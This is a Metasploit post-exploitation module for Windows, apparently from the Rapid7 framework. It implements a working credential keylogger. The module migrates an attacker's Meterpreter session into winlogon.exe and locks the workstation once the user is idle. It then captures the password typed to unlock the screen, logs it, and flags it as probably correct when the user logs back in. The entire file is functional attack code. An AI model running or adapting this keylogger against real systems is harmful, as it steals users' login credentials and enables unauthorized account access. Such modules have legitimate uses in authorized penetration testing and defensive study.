##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post
  include Msf::Post::File

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Windows Capture Winlogon Lockout Credential Keylogger',
        'Description' => %q{
          This module migrates and logs Microsoft Windows user's passwords via
          Winlogon.exe using idle time and natural system changes to give a
          false sense of security to the user.
        },
        'License' => MSF_LICENSE,
        'Author' => [ 'mubix', 'cg' ],
        'Platform' => ['win'],
        'SessionTypes' => ['meterpreter'],
        'References' => [['URL', 'http://blog.metasploit.com/2010/12/capturing-windows-logons-with.html']],
        'Compat' => {
          'Meterpreter' => {
            'Commands' => %w[
              core_migrate
              stdapi_railgun_api
              stdapi_sys_process_get_processes
              stdapi_sys_process_getpid
              stdapi_ui_get_idle_time
              stdapi_ui_get_keys_utf8
              stdapi_ui_start_keyscan
              stdapi_ui_stop_keyscan
            ]
          }
        },
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'SideEffects' => [SCREEN_EFFECTS],
          'Reliability' => []
        }
      )
    )

    register_options(
      [
        OptInt.new('INTERVAL', [true, 'Time between key collection during logging', 30]),
        OptInt.new('HEARTBEAT', [true, 'Heart beat between idle checks', 30]),
        OptInt.new('LOCKTIME', [true, 'Amount of idle time before lockout', 300]),
        OptInt.new('PID', [false, 'Target PID, only needed if multiple winlogon.exe instances exist', nil]),
        OptBool.new('WAIT', [true, 'Wait for lockout instead of default method', false])
      ]
    )
  end

  def check_admin
    status = client.railgun.shell32.IsUserAnAdmin()
    return status['return']
  end

  def get_winlogon
    winlogon = []
    session.sys.process.get_processes.each do |x|
      if x['name'].downcase == 'winlogon.exe'
        winlogon << x
      end
    end
    if winlogon.empty?
      print_status('Winlogon not found! Exiting')
      return 'exit'
    elsif winlogon.size == 1
      return winlogon[0]['pid']
    else
      print_error('Multiple WINLOGON processes found, run manually and specify pid')
      print_error('Be wise. XP / VISTA / 7 use session 0 - 2k3/2k8 use RDP session')
      winlogon.each do |tp|
        print_status("Winlogon.exe - PID: #{tp['pid']} - Session: #{tp['session']}")
      end
      return 'exit'
    end
  end

  # Function for starting the keylogger
  def startkeylogger(session)
    print_status('Starting the keystroke sniffer...')
    session.ui.keyscan_start
    return true
  rescue StandardError
    print_error('Failed to start Keylogging!')
    return false
  end

  # Function for Collecting Capture (pulled from Carlos Perez's Keylogrecorder)
  def keycap(session, keytime, logfile)
    rec = 1
    # Creating DB for captured keystrokes
    print_status("Keystrokes being saved in to #{logfile}")
    # Inserting keystrokes every number of seconds specified
    print_status('Recording ')
    while rec == 1
      # getting Keystrokes
      data = session.ui.keyscan_dump
      outp = ''
      data.unpack('n*').each do |inp|
        fl = (inp & 0xff00) >> 8
        vk = (inp & 0xff)
        kc = VirtualKeyCodes[vk]

        f_shift = fl & (1 << 1)
        _f_ctrl = fl & (1 << 2)
        _f_alt = fl & (1 << 3)

        if kc
          name = (((f_shift != 0) && (kc.length > 1)) ? kc[1] : kc[0])
          case name
          when /^.$/
            outp << name
          when /shift|click/i
            # ignore
          when 'Space'
            outp << ' '
          else
            outp << " <#{name}> "
          end
        else
          outp << ' <0x%.2x> ' % vk
        end
      end

      select(nil, nil, nil, 2)
      file_local_write(logfile, "#{outp}\n")
      if !outp.nil? && (outp.chomp.lstrip != '')
        print_status("Password?: #{outp}")
      end

      still_locked = 1
      # Check to see if the screen saver is on, then check to see if they have logged back in yet.
      screensaver = client.railgun.user32.SystemParametersInfoA(114, nil, 1, nil)['pvParam'].unpack('C*')[0]
      if screensaver == 0
        still_locked = client.railgun.user32.GetForegroundWindow()['return']
      end
      if still_locked == 0
        print_status('They logged back in, the last password was probably right.')
        raise 'win'
      end
      currentidle = session.ui.idle_time
      if screensaver == 0
        print_status("System has currently been idle for #{currentidle} seconds and the screensaver is OFF")
      else
        print_status("System has currently been idle for #{currentidle} seconds and the screensaver is ON")
      end
      select(nil, nil, nil, keytime.to_i)
    end
  rescue StandardError => e
    if e.message != 'win'
      print_line
      print_status("#{e.class} #{e}")
    end
    print_status('Stopping keystroke sniffer...')
    session.ui.keyscan_stop
  end

  def run
    # Make sure we are on a Windows host
    if client.platform != 'windows'
      print_error('This module does not support this platform.')
      return
    end

    # Log file variables
    host = session.session_host
    filenameinfo = '_' + ::Time.now.strftime('%Y%m%d.%M%S')	# Create Filename info to be appended to downloaded files
    logs = ::File.join(Msf::Config.log_directory, 'scripts', 'smartlocker')	# Create a directory for the logs
    ::FileUtils.mkdir_p(logs)	# Create the log directory
    logfile = logs + ::File::Separator + host + filenameinfo + '.txt'	# Logfile name

    # Check admin status
    admin = check_admin
    if admin == false
      print_error('Must be an admin to migrate into Winlogon.exe, exiting')
      return
    end

    mypid = session.sys.process.getpid
    if datastore['PID'] == 0
      targetpid = get_winlogon
      if targetpid == 'exit'
        return
      end

      print_status("Found WINLOGON at PID:#{targetpid}")
    else
      targetpid = datastore['PID']
      print_status("WINLOGON PID:#{targetpid} specified. I'm trusting you...")
    end

    if mypid == targetpid
      print_status('Already in WINLOGON no need to migrate')
    else
      print_status("Migrating from PID:#{mypid}")
      begin
        session.core.migrate(targetpid)
      rescue StandardError
        print_error('Unable to migrate, try getsystem first')
        return
      end
      print_good("Migrated to WINLOGON PID: #{targetpid} successfully")
    end

    # Override SystemParametersInfo Railgun call to check for Screensaver
    # Unfortunately 'pvParam' changes it's type for each uiAction so
    # it cannot be changed in the regular railgun defs
    client.railgun.add_function('user32', 'SystemParametersInfoA', 'BOOL', [
      ['DWORD', 'uiAction', 'in'],
      ['DWORD', 'uiParam', 'in'],
      ['PBLOB', 'pvParam', 'out'],
      ['DWORD', 'fWinIni', 'in']
    ])

    print_good("Keylogging for #{client.info}")
    file_local_write(logfile, "#{client.info}\n")
    if datastore['WAIT']
      print_status('Waiting for user to lock out their session')
      locked = false
      while locked == false
        if client.railgun.user32.GetForegroundWindow()['return'] != 0
          locked = true
          print_status('Session has been locked out')
        else
          # sleep(keytime.to_i) / hardsleep applied due to missing loging right after lockout.. no good way to solve this
          select(nil, nil, nil, 2)
        end
      end
    else
      currentidle = session.ui.idle_time
      print_status("System has currently been idle for #{currentidle} seconds")
      while currentidle <= datastore['LOCKTIME']
        print_status("Current Idle time: #{currentidle} seconds")
        select(nil, nil, nil, datastore['HEARTBEAT'])
        currentidle = session.ui.idle_time
      end
      client.railgun.user32.LockWorkStation()
      if client.railgun.user32.GetForegroundWindow()['return'] == 0
        print_error('Locking the workstation failed, trying again..')
        client.railgun.user32.LockWorkStation()
        if client.railgun.user32.GetForegroundWindow()['return'] == 0
          print_error('The system will not lock this session, nor will it be used for user login, exiting...')
          return
        end
        print_status('Locked this time, time to start keyloggin...')
      end
    end

    if startkeylogger(session)
      keycap(session, datastore['INTERVAL'], logfile)
    end
  end
end
